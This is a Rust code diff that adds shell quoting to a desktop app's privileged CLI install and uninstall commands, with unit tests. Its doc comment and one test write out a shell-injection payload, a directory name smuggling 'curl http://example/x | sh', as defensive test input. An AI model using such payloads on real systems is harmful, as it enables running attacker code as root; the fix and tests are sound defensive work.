@@ -45,6 +45,21 @@ fn bundled_cli_path(app: &tauri::AppHandle) -> Option<PathBuf> {
     }
 }
 
+/// Quotes a value for interpolation into a POSIX shell command line.
+///
+/// The escalated command below is assembled as text and handed to a shell, so a
+/// path carrying a single quote closes the literal and everything after it is
+/// read as shell syntax rather than as part of the path. A directory named
+/// `Apps'; curl http://example/x | sh; true '` would therefore run its payload
+/// as root, and the install would report success. Rendering `'` as `'\''` and
+/// wrapping the whole in single quotes leaves the shell no byte to interpret.
+///
+/// This composes with the AppleScript escaping applied to the finished line: the
+/// two layers cover different readers and neither replaces the other.
+fn sh_quote(value: &str) -> String {
+    format!("'{}'", value.replace('\'', r"'\''"))
+}
+
 /// Returns the target symlink path.
 fn symlink_target() -> PathBuf {
     PathBuf::from(SYMLINK_DIR).join(CLI_BINARY_NAME)
@@ -131,10 +146,10 @@ pub async fn install_cli(app: tauri::AppHandle) -> Result<(), String> {
 
     // Slow path: privilege escalation.
     let cmd = format!(
-        "mkdir -p '{}' && ln -sf '{}' '{}'",
-        symlink_dir.display(),
-        source.display(),
-        target.display()
+        "mkdir -p {} && ln -sf {} {}",
+        sh_quote(&symlink_dir.display().to_string()),
+        sh_quote(&source.display().to_string()),
+        sh_quote(&target.display().to_string())
     );
     run_with_admin_privileges(&cmd).await?;
     tracing::info!(
@@ -177,7 +192,7 @@ pub async fn uninstall_cli() -> Result<(), String> {
     }
 
     // Slow path: privilege escalation.
-    let cmd = format!("rm -f '{}'", target.display());
+    let cmd = format!("rm -f {}", sh_quote(&target.display().to_string()));
     run_with_admin_privileges(&cmd).await?;
     tracing::info!(path = %target.display(), "CLI symlink removed (with admin privileges)");
     Ok(())
@@ -230,5 +245,44 @@ async fn run_with_admin_privileges(command: &str) -> Result<(), String> {
     {
         let _ = command;
         Err("CLI installation is only supported on macOS and Linux".to_string())
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::sh_quote;
+
+    #[test]
+    fn quotes_a_plain_path() {
+        // GIVEN a path with no shell metacharacter
+        let path = "/Applications/Apollia.app";
+        // WHEN it is quoted
+        let quoted = sh_quote(path);
+        // THEN it is wrapped and otherwise untouched
+        assert_eq!(quoted, "'/Applications/Apollia.app'");
+    }
+
+    #[test]
+    fn a_single_quote_cannot_close_the_literal() {
+        // GIVEN a directory name carrying a single quote, which users write with
+        // no attacker involved: "Nidal's Apps", "Disque d'Elise"
+        let path = "/Users/x/Nidal's Apps/Apollia.app";
+        // WHEN it is quoted
+        let quoted = sh_quote(path);
+        // THEN the literal is closed, the quote escaped, the literal reopened
+        assert_eq!(quoted, r"'/Users/x/Nidal'\''s Apps/Apollia.app'");
+    }
+
+    #[test]
+    fn an_injection_payload_stays_data() {
+        // GIVEN the payload that made this function necessary: a directory name
+        // that closes the shell literal and appends a command
+        let path = "/Users/Shared/Apps'; curl http://example/x | sh; true '";
+        // WHEN it is quoted
+        let quoted = sh_quote(path);
+        // THEN no bare quote survives inside the value: each carries its escape
+        let inner = &quoted[1..quoted.len() - 1];
+        assert!(!inner.replace(r"'\''", "").contains('\''));
+        assert!(quoted.starts_with('\'') && quoted.ends_with('\''));
     }
 }
